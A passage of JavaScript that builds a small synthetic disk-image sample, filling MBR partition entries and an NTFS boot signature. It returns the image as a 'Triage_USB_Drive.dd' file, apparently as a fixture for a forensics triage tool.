  buf.writeUInt32LE(200000, 446 + 12); // Total sectors

  // Partition 2: Linux Ext4 / Triage
  buf[446 + 16] = 0x00;
  buf[446 + 16 + 4] = 0x83; // Linux Native
  buf.writeUInt32LE(202048, 446 + 16 + 8);
  buf.writeUInt32LE(100000, 446 + 16 + 12);

  // Write NTFS signature at LBA 2048 (offset 1024 bytes in our small sample buffer)
  buf.write(NTFS_SIGNATURE, 1024 + 3, 'ascii');
  buf.writeUInt16LE(512, 1024 + 11); // Bytes per sector
  buf[1024 + 13] = 8; // Sectors per cluster

  const blob = new Blob([buf], { type: 'application/octet-stream' });
  return new File([blob], 'Triage_USB_Drive.dd', {
    type: 'application/octet-stream',
    lastModified: Date.now() - 3600 * 1000 * 36,
  });
}
